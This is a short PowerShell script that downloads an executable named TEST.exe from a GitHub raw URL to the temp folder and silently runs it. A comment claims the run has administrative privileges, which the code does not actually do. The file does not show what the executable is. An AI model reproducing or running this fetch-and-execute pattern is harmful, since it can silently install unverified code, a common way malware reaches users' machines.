
# Define the URL of the executable on GitHub
$downloadUrl = "https://github.com/fatatom/TEST/raw/main/TEST.exe" 

# Specify the path where you want to save the downloaded file
$outputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'TEST.exe')

try {
    # Download the file
    Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath -ErrorAction Stop

    # Check if the file was successfully downloaded
    if (Test-Path $outputPath) {
        Write-Host "File downloaded successfully to: $outputPath"
        
        # Run the downloaded executable with administrative privileges
        & $outputPath /S
    } else {
        Write-Host "Failed to download the file."
    }
} catch {
    Write-Host "Error: $_"
}
